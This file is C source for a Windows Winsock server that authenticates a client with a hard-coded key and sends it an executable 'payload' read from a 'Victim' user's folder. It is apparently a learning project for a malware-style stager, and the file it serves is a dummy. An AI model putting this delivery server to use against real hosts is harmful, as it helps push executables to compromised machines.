#ifndef _WIN32_WINNT
#define _WIN32_WINNT 0x0600
#endif

#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>

#pragma comment(lib, "ws2_32.lib")

const unsigned int KEY_SIZE = 15;
const char* KEY = "This is a test!";
const char* payload_path = "C:\\Users\\Victim\\OneDrive\\Documentos\\Projects\\CC++\\C\\client_server\\dummy\\dummy.exe";
const size_t PREFIX_SIZE = 4;


void printBytes(const unsigned char* data, size_t dataLen) {
	for (size_t i = 0; i < dataLen; ++i) {
		printf("%02x ", data[i]);
	}
	printf("\n");
}

int initializeWSA(void) {
	WSADATA wsa_data;
	return WSAStartup(MAKEWORD(2, 2), &wsa_data);
}

void cleanup(SOCKET listening_socket, SOCKET client_socket)
{
	printf("[+] Cleaning up ...\n");

	if (listening_socket != INVALID_SOCKET)
	{
		closesocket(listening_socket);
	}

	if (client_socket != INVALID_SOCKET)
	{
		closesocket(client_socket);
	}

	WSACleanup();
}

// Configures local address, creates listening socket, and binds socket to local address
int initialize_server(SOCKET* listening_socket)
{
	printf("[+] Configuring local address ...\n");

	struct addrinfo hints;
	memset(&hints, 0, sizeof(hints));

	hints.ai_flags = AI_PASSIVE;
	hints.ai_family = AF_INET;
	hints.ai_socktype = SOCK_STREAM;

	struct addrinfo* bind_address;
	if (getaddrinfo(NULL, "8080", &hints, &bind_address) != 0)
	{
		fprintf(stderr, "[!] getaddrinfo() failed. (%d)\n", WSAGetLastError());
		return 1;
	}

	printf("[+] Creating the socket ...\n");

	*listening_socket = socket(
		bind_address->ai_family,
		bind_address->ai_socktype,
		bind_address->ai_protocol
	);

	if (*listening_socket == INVALID_SOCKET)
	{
		fprintf(stderr, "[!] socket() failed. (%d)\n", WSAGetLastError());
		freeaddrinfo(bind_address);
		bind_address = NULL;
		return 1;
	}

	printf("[+] Binding socket to local address ...\n");

	if (bind(*listening_socket, bind_address->ai_addr, bind_address->ai_addrlen) != 0)
	{
		fprintf(stderr, "[!] Failed to bind socket to local address. (%d)\n", WSAGetLastError());
		freeaddrinfo(bind_address);
		bind_address = NULL;
		return 1;
	}
	freeaddrinfo(bind_address);

	return 0;
}

int get_client(SOCKET listening_socket, SOCKET* client_socket)
{
	printf("[+] Starting listening ...\n");

	if (listen(listening_socket, 1) < 0)
	{
		fprintf(stderr, "[!] listen() failed. (%d)\n", WSAGetLastError());
		return 1;
	}

	printf("[+] Waiting for connection ...\n");

	struct sockaddr_storage client_address;
	socklen_t client_len = sizeof(client_address);
	memset(&client_address, 0, client_len);
	*client_socket = accept(listening_socket, (struct sockaddr*)&client_address, &client_len);

	if (*client_socket == INVALID_SOCKET)
	{
		fprintf(stderr, "[!] accept() failed. (%d)\n", WSAGetLastError());
		cleanup(listening_socket, INVALID_SOCKET);
		return 1;
	}

	char address_buffer[100];
	getnameinfo(
		(struct sockaddr*)&client_address,
		client_len,
		address_buffer,
		sizeof(address_buffer),
		0,
		0,
		NI_NUMERICHOST
	);
	printf("[i] Connection accepted from: %s\n", address_buffer);

	return 0;
}

// Authenticate client
int receive_and_validate_key(SOCKET client_socket, const char* expected_key, size_t key_size)
{
	char message_buffer[1024];
	int bytes_received = recv(client_socket, message_buffer, sizeof(message_buffer), 0);

	if (bytes_received < 0)
	{
		fprintf(stderr, "[!] recv() failed. (%d)\n", WSAGetLastError());
		return -1;
	}

	if (bytes_received < key_size)
	{
		fprintf(stderr, "[!] Received data is smaller than expected key size.\n");
		return -1;
	}

	printf("[+] Validating client ...\n");

	char* key_buffer = (char*)malloc(key_size);
	if (key_buffer == NULL)
	{
		fprintf(stderr, "[!] Failed to allocate memory for key.\n");
		return -1;
	}

	memcpy(key_buffer, message_buffer, key_size);

	int validation_result = 0;
	if (memcmp(key_buffer, expected_key, key_size) != 0)
	{
		fprintf(stderr, "[!] Invalid key received.\n");
		validation_result = -1;
	}
	else
	{
		printf("[i] Valid key received.\n");
	}

	free(key_buffer);
	return validation_result;
}

int fetch_payload(unsigned char** payload, size_t* payload_size)
{
	printf("[+] Fetching payload from %s ...\n", payload_path);

	// Open the file in binary mode
	FILE *fp = fopen(payload_path, "rb");

    if (fp == NULL)
    {
        fprintf(stderr, "[!] fopen() failed. Error code: %d (%s)\n", errno, strerror(errno));
        return 1; // Or a custom error code
    }

	// Get file size
	fseek(fp, 0, SEEK_END);
	long file_size = ftell(fp);
	*payload_size = file_size;
	fseek(fp, 0, SEEK_SET); 

	// Allocate memory for the file contents
	*payload = (unsigned char *)malloc(file_size + 1);

	if (*payload == NULL)
	{
		fprintf(stderr, "[!] malloc() failed.\n");
		fclose(fp);
		return 1;
	}

	// Read the file contents into the payload buffer
	size_t bytes_read = fread(*payload, 1, file_size, fp);

	if (bytes_read != file_size)
	{
		fprintf(stderr, "[!] fread() failed.\n");
		free(*payload);
		fclose(fp);
		return 1;
	}

	if (fclose(fp) != 0)
	{
		fprintf(stderr, "[!] fclose() failed. Error code: %d (%s)\n", errno, strerror(errno));
		free(*payload);
		return 1;
	}

	return 0;
}

int prepare_message(
	const unsigned char* raw_message,
	size_t raw_message_size,
	unsigned char** prepared_message,
	size_t* prepared_message_size
)
{
	printf("[+] Preparing message ...\n");

	// Allocate memory to the buffer which will hold the prepared message
	*prepared_message_size = PREFIX_SIZE + raw_message_size;
	*prepared_message = (unsigned char*)malloc(*prepared_message_size);

	// Allocation failed - Return error
	if (*prepared_message == NULL)
	{
		return -1;
	}

	// Add the first 4 bytes (length-prefix)
	(*prepared_message)[0] = (unsigned char)((raw_message_size >> 24) & 0xFF);
	(*prepared_message)[1] = (unsigned char)((raw_message_size >> 16) & 0xFF);
	(*prepared_message)[2] = (unsigned char)((raw_message_size >> 8) & 0xFF);
	(*prepared_message)[3] = (unsigned char)(raw_message_size & 0xFF);

	// Add the rest of the message
	memcpy(*prepared_message + 4, raw_message, raw_message_size);

	return 0;
}

int send_data(SOCKET client_socket, const unsigned char* payload, const size_t payload_size)
{
	printf("[+] Sending data to client ....\n");

	unsigned char* prepared_message;
	size_t prepared_message_size;
	if (prepare_message(payload, payload_size, &prepared_message, &prepared_message_size) != 0)
	{
		fprintf(stderr, "[!] prepare_message() failed.\n");
		return 1;
	}

	int bytes_sent = send(client_socket, prepared_message, prepared_message_size, 0);
	if (bytes_sent <= 0) {
		fprintf(stderr, "[!] send() failed. (%d)\n", WSAGetLastError());
		return -1;
	}

	printf("[i] Sent %d bytes to client.\n", bytes_sent - PREFIX_SIZE);

	return 0;
}

int main(void)
{
	if (initializeWSA() != 0)
	{
		printf("[!] Failed to run WSAStartup.\n");
		return 1;
	}

	SOCKET listening_socket;
	if (initialize_server(&listening_socket) != 0)
	{
		fprintf(stderr, "[!] initialize_socket() failed.\n");
		return 1;
	}

	SOCKET client_socket;
	if (get_client(listening_socket, &client_socket) != 0)
	{
		fprintf(stderr, "[!] get_client() failed.\n");
		return 1;
	}

	const char* expected_key = "This is a test!";
	if (receive_and_validate_key(client_socket, expected_key, strlen(expected_key)) != 0)
	{
		fprintf(stderr, "[!] receive_and_validate_key() failed.\n");
		return 1;
	}

	unsigned char* payload = NULL;
	size_t payload_size = 0;
	if (fetch_payload(&payload, &payload_size) != 0)
	{
		fprintf(stderr, "[!] fetch_payload() failed.\n");
		return 1;
	}

	if (send_data(client_socket, payload, payload_size) != 0) {
		free(payload);
		cleanup(listening_socket, client_socket);
		return 1;
	}

	free(payload);
	cleanup(listening_socket, client_socket);
	return 0;
}